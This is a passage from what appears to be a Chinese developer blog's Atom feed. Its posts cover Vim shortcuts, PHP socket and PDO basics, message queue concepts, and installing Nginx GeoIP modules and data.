align="left"><strong><code>TRUE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr></tbody></table><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP 类型比较表</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;之所以决定写这片笔记，是因为一直对 空 这个概念很模糊，在代码逻辑中常会遇到需要判断的时候，总是模拟两可。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Vim 常用快捷键总结</title>
    <link href="https://www.0x2beace.com/summary-of-vim-commonly-used-shortcut-keys/"/>
    <id>https://www.0x2beace.com/summary-of-vim-commonly-used-shortcut-keys/</id>
    <published>2020-10-16T11:16:43.000Z</published>
    <updated>2020-10-18T08:12:31.937Z</updated>
    
    <content type="html"><![CDATA[<p>Vim 是我在Linux 下比较常用的文本编辑器，这里整理一下常用的操作。</p><a id="more"></a><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul><li>移动到行首：<code>0</code></li><li>移动到行尾：<code>$</code></li><li>光标移动到文件开始位置：<code>gg</code></li><li>光标移动到文件结束位置: <code>shift + g</code></li><li>删除所有内容：<code>ggdG</code></li><li>单行删除：<code>dd</code></li><li>单行复制：<code>yy</code></li><li>粘贴：<code>p</code></li><li>复制全部内容：<code>ggyG</code></li></ul><h3 id="移动到指定行"><a href="#移动到指定行" class="headerlink" title="移动到指定行"></a>移动到指定行</h3><p>在vim 中直接移动到指定行数，有三种方式（均是在命令行模式下输入，n 为指定的行号）：</p><ol><li>ngg/ nG</li><li>:n</li><li>vim +n filename</li></ol><h3 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h3><p>当前行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x2F;XXX&#x2F;YYY&#x2F;g</span><br></pre></td></tr></table></figure><p>其中XXX 是需要替换的字符串，YYY是替换后的字符串。</p><p>全局替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s&#x2F;XXX&#x2F;YYY&#x2F;g</span><br></pre></td></tr></table></figure><h3 id="一些配置"><a href="#一些配置" class="headerlink" title="一些配置"></a>一些配置</h3><ul><li>查找字符设置高亮：<code>set hlsearch</code></li><li>显示行号：<code>set number</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Vim 是我在Linux 下比较常用的文本编辑器，这里整理一下常用的操作。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Vim" scheme="https://www.0x2beace.com/tags/Vim/"/>
    
  </entry>
  
  <entry>
    <title>PHP Socket 编程</title>
    <link href="https://www.0x2beace.com/php-socket-programming/"/>
    <id>https://www.0x2beace.com/php-socket-programming/</id>
    <published>2020-10-15T14:29:16.000Z</published>
    <updated>2020-10-15T14:30:23.551Z</updated>
    
    <content type="html"><![CDATA[<p>最近因为一些原因接触到一个老古董项目，这个项目虽然有些老，但仔细看一看，还是能学到一些东西的。</p><p>关于 PHP Socket 编程的文章有很多，这里就只简单记录一下如何快速上手。</p><a id="more"></a><h2 id="什么是-Socket"><a href="#什么是-Socket" class="headerlink" title="什么是 Socket"></a>什么是 Socket</h2><p>按照惯例，还是先来了解一下基本概念。</p><p>我们知道两个进程如果需要进程通讯，最基本的前提就是保证彼此进程的唯一，并能确定彼此身份。在本地进程通讯中我们可以使用 PID 来标示唯一的进程，但 PID 只在本地唯一，网络中的两个进程 PID 冲突的几率很大，这时候我们就需要另辟蹊径了。</p><p>我们知道IP 层的IP 地址可以唯一标示主机，而TCP 层协议和端口号可以唯一标示主机的一个进程，这样我们就可以利用 IP 地址+ 协议 + 端口号唯一标示网络中的一个进程。</p><p>能够唯一标示网络中的进程后，它们就可以利用socket 进行通信了。</p><blockquote><p>什么是socket？</p></blockquote><p>我们经常把 socket 翻译成套接字，<strong>socket 是在应用层和传输层之间的一个抽象层，它把 TCP/IP 层复杂的操作抽象为几个简单的接口供应用层调用以实现进程在网络中通信</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201015094303.png" alt=""></p><p>socket 起源于 UNIX，在UNIX 一切皆为文件哲学的思想下，socket 是一种“打开=&gt;读/写=&gt;关闭“模式的实现，服务器和客户端各自维护一个文件，在建立连接打开之后，可以向自己的文件写入内容供对方读取或者读取对方内容，通讯结束时关闭文件。</p><h3 id="socket-通信流程"><a href="#socket-通信流程" class="headerlink" title="socket 通信流程"></a>socket 通信流程</h3><p>socket 是”打开=&gt;读/写=&gt;关闭”模式的实现，以使用TCP协议通讯的socket为例，其交互流程大概是这样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201015094756.png" alt=""></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>PHP 默认没有启用 sockets 扩展，所以需要手动安装扩展。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.2-sockets</span><br></pre></td></tr></table></figure><p><code>php -m</code> 或者 <code>php -i</code>检查扩展是否已经启用。</p><h3 id="创建连接"><a href="#创建连接" class="headerlink" title="创建连接"></a>创建连接</h3><p>创建并返回一个套接字，也称作一个通讯节点。一个典型的网络连接由 2 个套接字构成，一个运行在客户端，另一个运行在服务端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 创建一个TCP 协议的 socket</span><br><span class="line">$socket &#x3D; socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);</span><br><span class="line"></span><br><span class="line"># 创建一个本地的socket</span><br><span class="line">$socket &#x3D; socket_create(AF_UNIX, SOCK_STREAM, 0);</span><br></pre></td></tr></table></figure><p><code>socket_create</code>函数接收三个参数，分别是domain、type、protocol。 </p><ul><li>domain：当前套接字使用什么协议</li><li>type：当前套接字的类型</li><li>protocol：设置指定 domain 套接字下的具体协议</li></ul><h3 id="发送内容"><a href="#发送内容" class="headerlink" title="发送内容"></a>发送内容</h3><p>发送数据有两种方式：</p><ol><li>socket_send：发送消息至已连接的客户端。</li><li>socket_sendto：发送消息至客户端，无论是否连接。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);</span><br><span class="line"></span><br><span class="line">$msg &#x3D; &quot;Ping !&quot;;</span><br><span class="line">$len &#x3D; strlen($msg);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 向本地 1223 端口发送内容</span><br><span class="line">socket_sendto($sock, $msg, $len, 0, &#39;127.0.0.1&#39;, 1223);</span><br><span class="line">socket_close($sock);</span><br></pre></td></tr></table></figure></li></ol><h3 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h3><p>接收数据也有两种方式：</p><ol><li>socket_recv：从已连接的socket 接收数据</li><li>socket_recvfrom：从socket 接收数据，无论是否连接</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);</span><br><span class="line"></span><br><span class="line"># 从本地 1223 端口获取内容</span><br><span class="line">socket_recvfrom($socket, $buf, 1024, 0, &quot;127.0.0.1&quot;, 1223);</span><br><span class="line">var_dump($buf); &#x2F;&#x2F; Ping !</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/dolphinx/p/3460545.html" target="_blank" rel="noopener">简单理解Socket</a></li><li><a href="https://segmentfault.com/a/1190000014044351" target="_blank" rel="noopener">一篇搞懂TCP、HTTP、Socket、Socket连接池</a></li><li><a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create</a></li><li><a href="https://www.php.net/manual/zh/function.socket-sendto.php" target="_blank" rel="noopener">socket_sendto</a></li><li><a href="https://www.php.net/manual/zh/function.socket-bind.php" target="_blank" rel="noopener">socket_bind</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近因为一些原因接触到一个老古董项目，这个项目虽然有些老，但仔细看一看，还是能学到一些东西的。&lt;/p&gt;
&lt;p&gt;关于 PHP Socket 编程的文章有很多，这里就只简单记录一下如何快速上手。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Socket" scheme="https://www.0x2beace.com/tags/Socket/"/>
    
  </entry>
  
  <entry>
    <title>PHP PDO 快速上手</title>
    <link href="https://www.0x2beace.com/php-pdo-quick-start/"/>
    <id>https://www.0x2beace.com/php-pdo-quick-start/</id>
    <published>2020-10-13T23:51:48.000Z</published>
    <updated>2020-10-13T23:53:56.113Z</updated>
    
    <content type="html"><![CDATA[<p>最近用到了 <code>PHP PDO</code>相关的知识，整理总结一下。</p><a id="more"></a><h2 id="PDO-是什么？"><a href="#PDO-是什么？" class="headerlink" title="PDO 是什么？"></a>PDO 是什么？</h2><p>PDO（PHP Data Object）</p><p>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</p><h2 id="PDO-能做什么？"><a href="#PDO-能做什么？" class="headerlink" title="PDO 能做什么？"></a>PDO 能做什么？</h2><p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</p><p>在 PHP 使用 MySQL 数据库前，你需要先将它们连接。</p><p>PHP 5 及以上版本有两种方式连接 MySQL :</p><ul><li>MySQLi extension (“i” 意为 improved)</li><li>PDO (PHP Data Objects)</li></ul><blockquote><p>关于是选择 Mysqli，还是 PDO？</p></blockquote><p>MySQLi 和 PDO 有它们自己的优势：PDO 应用在 12 种不同数据库中， MySQLi 只针对 MySQL 数据库。</p><p>如果项目需要在多种数据库中切换，建议使用 PDO，因为只需要修改连接字符串和部分查询语句即可。</p><h3 id="PDO-安装"><a href="#PDO-安装" class="headerlink" title="PDO 安装"></a>PDO 安装</h3><p>在 PHP5 系列版本中，PDO不是默认支持的，需要手工配置才可以使用。打开 php.ini 文件，开启扩展。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; php.ini</span><br><span class="line">extension&#x3D;php_pdo.dll</span><br><span class="line">extension&#x3D;php_pdo_mysql.dll</span><br></pre></td></tr></table></figure><p>上述配置只打开了对 MySQL 的 PDO 支持，如果需要对别的数据库类型进行支持，可以分别打开对应的不同配置（去掉前面的分号）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;extension&#x3D;php_pdo_oci.dll</span><br><span class="line">;extension&#x3D;php_pdo_oci8.dll</span><br><span class="line">;extension&#x3D;php_pdo_odbc.dll</span><br><span class="line">;extension&#x3D;php_pdo_pgsql.dll</span><br><span class="line">;extension&#x3D;php_pdo_sqlite.dll</span><br></pre></td></tr></table></figure><h2 id="PDO-创建连接"><a href="#PDO-创建连接" class="headerlink" title="PDO 创建连接"></a>PDO 创建连接</h2><p>在使用 PDO 操作数据库之前，需要创建 PDO 连接对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new PDO(DSN, username, password);&lt;?php</span><br><span class="line"></span><br><span class="line">$dsn &#x3D; &quot;mysql:host&#x3D;localhost; dbname&#x3D;databasename&quot;;</span><br><span class="line">$stmt &#x3D; new PDO($dsn, &#39;user&#39;, &#39;pwd&#39;);</span><br></pre></td></tr></table></figure><p>不同的数据库，其 DSN(Data Source Name) 构造方式是不一样的。常见数据库 DSN 语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;MySQL:</span><br><span class="line">$dsn &#x3D; mysql:host&#x3D;hostname;dbname&#x3D;db_name)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;SQLite:</span><br><span class="line">$dsn &#x3D; sqlite:db_name</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;PGSQL</span><br><span class="line">$dsn pgsql:host&#x3D;hostname port&#x3D;port_id dbname&#x3D;db_name user&#x3D;username password&#x3D;password</span><br></pre></td></tr></table></figure><h3 id="PDO-Mysql-预处理语句"><a href="#PDO-Mysql-预处理语句" class="headerlink" title="PDO Mysql 预处理语句"></a>PDO Mysql 预处理语句</h3><p><strong>预处理语句及绑定参数</strong><br>预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。</p><p>预处理语句的工作原理如下：</p><ol><li>预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记 。例如：INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)</li><li>数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出</li><li>执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。</li></ol><p>相比于直接执行SQL语句，预处理语句有两个主要优点：</p><ul><li>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）</li><li>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句</li><li>预处理语句针对SQL注入是非常有用的，因为 参数值发送后使用不同的协议，保证了数据的合法性。</li></ul><p>PDO的直接查询和预处理分别是PDO 的 query类和 prepare 类。</p><ul><li>PDO::prepare — 备要执行的SQL语句并返回一个 PDOStatement 对象</li><li>PDO::query — 执行 SQL 语句，返回PDOStatement对象,可以理解为结果集</li><li>前者其实就是执行 sql 语句，返回一个结果集对象（PDOStatement），然后操作 PDOStatement类，从结果集中取出相应的数据。</li><li>后者虽然也会返回一个 PDOSTatement 对象，但区别就在于两者的处理方式不同。query 是直接执行 sql 语句，而 prepare 是通过预处理的方式执行 sql 语句（更安全，更高效）。</li></ul><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p>PDO 默认开启的是错误码模式，如果发生了错误，只会简单地输出错误码，这对于调试或者测试来说，不是很友好，不利用快速定位异常所在。</p><p>所以PDO 还为我们提供了另外两种方式：</p><h4 id="PDO-ERRMODE-WARNING"><a href="#PDO-ERRMODE-WARNING" class="headerlink" title="PDO::ERRMODE_WARNING"></a>PDO::ERRMODE_WARNING</h4><p>除设置错误码之外，PDO 还将发出一条传统的 E_WARNING 信息。如果只是想看看发生了什么问题且不中断应用程序的流程，那么此设置在调试/测试期间非常有用。</p><h4 id="PDO-ERRMODE-EXCEPTION"><a href="#PDO-ERRMODE-EXCEPTION" class="headerlink" title="PDO::ERRMODE_EXCEPTION"></a>PDO::ERRMODE_EXCEPTION</h4><p>除设置错误码之外，PDO 还将抛出一个 PDOException 异常类并设置它的属性来反射错误码和错误信息。此设置在调试期间也非常有用，因为它会有效地放大脚本中产生错误的点，从而可以非常快速地指出代码中有问题的潜在区域（记住：如果异常导致脚本终止，则事务被自动回滚）。</p><p>创建 PDO 实例并设置错误模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dsn &#x3D; &#39;mysql:dbname&#x3D;testdb;host&#x3D;127.0.0.1&#39;;</span><br><span class="line">$user &#x3D; &#39;dbuser&#39;;</span><br><span class="line">$password &#x3D; &#39;dbpass&#39;;</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">    $dbh &#x3D; new PDO($dsn, $user, $password);</span><br><span class="line">    &#x2F;&#x2F; 开启ERRMODE_EXCEPTION 模式</span><br><span class="line">    $dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo &#39;Connection failed: &#39; . $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="http://www.5idev.com/p-php_pdo.shtml" target="_blank" rel="noopener">PHP PDO</a></li><li><a href="http://www.5idev.com/p-php_pdo_query.shtml" target="_blank" rel="noopener">PHP PDO-&gt;query类</a></li><li><a href="https://www.w3cschool.cn/php/php-mysql-prepared-statements.html" target="_blank" rel="noopener">PHP Mysql 预处理语句</a></li><li><a href="https://www.w3cschool.cn/php/php-mysql-connect.html" target="_blank" rel="noopener">PHP 多种方式连接Mysql </a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近用到了 &lt;code&gt;PHP PDO&lt;/code&gt;相关的知识，整理总结一下。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="PDO" scheme="https://www.0x2beace.com/tags/PDO/"/>
    
  </entry>
  
  <entry>
    <title>消息队列快速上手</title>
    <link href="https://www.0x2beace.com/quick-start-message-queue/"/>
    <id>https://www.0x2beace.com/quick-start-message-queue/</id>
    <published>2020-10-11T12:03:16.000Z</published>
    <updated>2020-10-13T23:54:23.637Z</updated>
    
    <content type="html"><![CDATA[<p>业务场景描述：</p><ol><li>订单创建成功之后，每一笔订单都需要进行统计及其他业务处理。</li><li>如何及时发现处理失败的订单，然后进行补单处理。</li><li>订单所产生佣金的处理。</li></ol><a id="more"></a><h2 id="困境"><a href="#困境" class="headerlink" title="困境"></a>困境</h2><p>该应用因为一些历史原因使用 Mysql 的数据表作为消息队列。</p><p>整个系统中有多个生产者会向该数据表中插入记录，同时有一个脚本会作为消费者去数据库中查找记录并进行处理。</p><p>但是这样做是存在一些问题的：</p><ol><li>长时间与数据库保持连接进行查询操作，消耗服务器资源。</li><li>在数据量较大或者延时较高的情况下，不能及时处理完，会影响其他业务。</li></ol><p>所以更好的方式应该是使用消息队列来解决。</p><h3 id="什么是消息队列？"><a href="#什么是消息队列？" class="headerlink" title="什么是消息队列？"></a>什么是消息队列？</h3><p>消息队列（Message Queue），是分布式系统中重要的组件，其通用的使用场景可以简单地描述为：</p><blockquote><p>当不需要立即获得结果，但是并发量又需要进行控制的时候，差不多就是需要使用消息队列的时候。</p></blockquote><h3 id="常见应用场景"><a href="#常见应用场景" class="headerlink" title="常见应用场景"></a>常见应用场景</h3><p>其常见的应用场景有以下几个：</p><ul><li>应用耦合：多应用间通过消息队列对同一消息进行处理，避免调用接口失败导致整个过程失败；</li><li>异步处理：多应用对消息队列中同一消息进行处理，应用间并发处理消息，相比串行处理，减少处理时间；</li><li>限流削峰：广泛应用于秒杀或抢购活动中，避免流量过大导致应用系统挂掉的情况；</li><li>消息驱动的系统：系统分为消息队列、消息生产者、消息消费者，生产者负责产生消息，消费者(可能有多个)负责对消息进行处理；</li></ul><h4 id="1-异步处理"><a href="#1-异步处理" class="headerlink" title="1. 异步处理"></a>1. 异步处理</h4><p>场景描述：用户注册之后，需要邮箱或者短信通知，传统的做法有两种：</p><p>串行：</p><ol><li>注册成功</li><li>发送邮件</li><li>发送短信</li></ol><p>只有等以上三个任务全部完成之后，才会返回客户端。</p><p>并行：</p><ol><li>注册成功</li><li>发送邮件并同时发送短信</li></ol><p>虽然也是需要以上三个任务全部完成才会返回客户端，但并行与串行的区别就在于，通过使用多线程来缩短程序处理时间。</p><p>假设三个业务节点每个使用50毫秒钟，不考虑网络等其他开销，则串行方式的时间是150毫秒，并行的时间可能是100毫秒。</p><p>因为CPU在单位时间内处理的请求数是一定的，假设CPU1秒内吞吐量是100次。则串行方式1秒内CPU可处理的请求量是7次（1000/150）。并行方式处理的请求量是10次（1000/100）。</p><p>就该场景而言，如何突破传统方式带来的性能瓶颈？</p><p>解决方案：</p><ol><li>引入消息队列</li><li>将不是必须的业务逻辑，加入队列中，进行异步处理。</li></ol><h4 id="2-应用解耦"><a href="#2-应用解耦" class="headerlink" title="2. 应用解耦"></a>2. 应用解耦</h4><h3 id="消息队列模式"><a href="#消息队列模式" class="headerlink" title="消息队列模式"></a>消息队列模式</h3><p>消息队列包括两种模式，点对点模式（point to point， queue）和发布/订阅模式（publish/subscribe，topic）。</p><h4 id="点对点模式"><a href="#点对点模式" class="headerlink" title="点对点模式"></a>点对点模式</h4><p>点对点模式包括以下三个角色：</p><ol><li>消息队列</li><li>生产者</li><li>消费者</li></ol><p>生产者将消息发送到队列中，消费者从队列中取出消息进行消费，消息被消费之后，消息不再被存储。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201009193326.png" alt=""></p><p>点对点模式的特点：</p><ol><li>每个消息只有一个接收者（Consumer）(即一旦被消费，消息就不再在消息队列中)。</li><li>生产者和消费者之间没有依赖性，不会因为消费者是否在线，都会存在于队列中。</li></ol><h4 id="发布-订阅模式"><a href="#发布-订阅模式" class="headerlink" title="发布/订阅模式"></a>发布/订阅模式</h4><p>发布/订阅模式下包括三个角色：</p><ol><li>频道</li><li>发布者</li><li>订阅者</li></ol><p>发布者将消息发布在频道中，频道将消息传递给所有订阅者。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201009193341.png" alt=""></p><p>发布/订阅模式特点：</p><ol><li>每个消息可以有多个订阅者</li><li>发布者和订阅者之间存在依赖关系，必须先订阅频道，发布者发布的消息才会被订阅者所接收。</li><li>因为发布的消息是无状态的，所以订阅者需要订阅频道且在线。</li></ol><h3 id="常用消息队列"><a href="#常用消息队列" class="headerlink" title="常用消息队列"></a>常用消息队列</h3><ul><li>RabbitMQ</li><li>ActiveMQ</li><li>RocketMQ</li><li>Kafka</li><li>Redis</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/centos2017/p/10451411.html" target="_blank" rel="noopener">为什么会需要消息队列(MQ)？</a></li><li><a href="https://www.cnblogs.com/wt645631686/p/8243438.html" target="_blank" rel="noopener">PHP(Mysql/Redis)消息队列的介绍及应用场景案例</a></li><li><a href="https://cloud.tencent.com/developer/article/1006035" target="_blank" rel="noopener">消息队列及常见消息队列介绍</a></li><li><a href="https://segmentfault.com/q/1010000021533696" target="_blank" rel="noopener">PHP大量数据写入文档，如何异步处理？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;业务场景描述：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;订单创建成功之后，每一笔订单都需要进行统计及其他业务处理。&lt;/li&gt;
&lt;li&gt;如何及时发现处理失败的订单，然后进行补单处理。&lt;/li&gt;
&lt;li&gt;订单所产生佣金的处理。&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="MQ" scheme="https://www.0x2beace.com/tags/MQ/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 如何根据 IP 获取地域信息</title>
    <link href="https://www.0x2beace.com/how-does-nginx-obtain-geographic-information-based-on-ip/"/>
    <id>https://www.0x2beace.com/how-does-nginx-obtain-geographic-information-based-on-ip/</id>
    <published>2020-10-08T09:29:34.000Z</published>
    <updated>2020-10-11T12:01:45.888Z</updated>
    
    <content type="html"><![CDATA[<p>最近有一个需求：需要根据用户的IP 获取其国家，然后根据不同国家进行代理转发。</p><a id="more"></a><p>想要完成这个需求，首先第一个解决的问题就是获取IP 地址所对应的地理位置：</p><ol><li>这个需求通常是由 GeoIP 这个模块来完成的，Nginx 默认没有开启该模块。</li><li>GeoIP 是基于 maxmind 提供的数据文件进行分析的，所以还需要下载 maxmind 的数据源文件。</li></ol><h3 id="安装GeoIP-模块"><a href="#安装GeoIP-模块" class="headerlink" title="安装GeoIP 模块"></a>安装GeoIP 模块</h3><p>前面也提到了MaxMind GeoLite Legacy数据库目前已停产，应改用MaxMind GeoIP2或Geolite2数据库和NGINX Plus GeoIP2模块。</p><p>Centos：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install nginx-plus-module-geoip2</span><br></pre></td></tr></table></figure><p>Ubuntu：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx-plus-module-geoip2</span><br></pre></td></tr></table></figure><p>然后将 load_module 指令都放在nginx.conf 的配置文件的顶部：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load_module modules&#x2F;ngx_http_geoip2_module.so;</span><br><span class="line">load_module modules&#x2F;ngx_stream_geoip2_module.so;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安装-GeoIP-数据源"><a href="#安装-GeoIP-数据源" class="headerlink" title="安装 GeoIP 数据源"></a>安装 GeoIP 数据源</h3><p>自从 2019年12月30日开始，就不能直接从MaxMind 上下载了，需要先注册一个账号，获取 license key，然后wget 时带上 key。具体可以查阅<a href="https://blog.maxmind.com/2019/12/18/significant-changes-to-accessing-and-using-geolite2-databases/" target="_blank" rel="noopener">这篇文章</a>。</p><p>这是一种安装方式，如果觉得麻烦，可以尝试下面这种方式。</p><ol><li><p>安装依赖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:maxmind&#x2F;ppa</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install libgeoip1 libgeoip-dev geoip-bin</span><br></pre></td></tr></table></figure></li><li><p>下载源码包，安装应用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;geoip-api-c&#x2F;releases&#x2F;download&#x2F;v1.6.12&#x2F;GeoIP-1.6.12.tar.gz</span><br><span class="line"></span><br><span class="line">sudo tar -zxvf GeoIP-1.6.12.tar.gz</span><br><span class="line">cd GeoIP-1.6.12 &amp;&amp; \</span><br><span class="line">.&#x2F;configure &amp;&amp; \</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure></li><li><p>查找<code>GeoIP.dat</code>所在位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo find &#x2F; -name GeoIP.dat</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;GeoIP&#x2F;GeoIP.dat</span><br></pre></td></tr></table></figure></li><li><p>在配置文件中使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">geoip_country 